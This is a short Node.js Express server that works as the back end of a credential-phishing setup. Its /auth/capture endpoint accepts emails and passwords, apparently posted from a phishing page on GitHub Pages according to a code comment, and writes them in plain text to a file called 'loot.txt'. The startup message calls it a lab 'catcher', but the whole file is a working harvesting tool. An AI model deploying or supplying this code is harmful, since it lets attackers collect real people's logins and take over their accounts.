const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();

app.use(cors()); // Critical for GitHub Pages to talk to your local machine
app.use(express.json());

app.post('/auth/capture', (req, res) => {
    const { email, password } = req.body;
    const entry = `[${new Date().toLocaleString()}] User: ${email} | Pass: ${password}\n`;
    
    fs.appendFileSync('loot.txt', entry);
    console.log("Captured Credentials logged to loot.txt");
    res.sendStatus(200);
});

app.listen(3000, () => console.log("ENI-Lab: Catcher running on port 3000"));
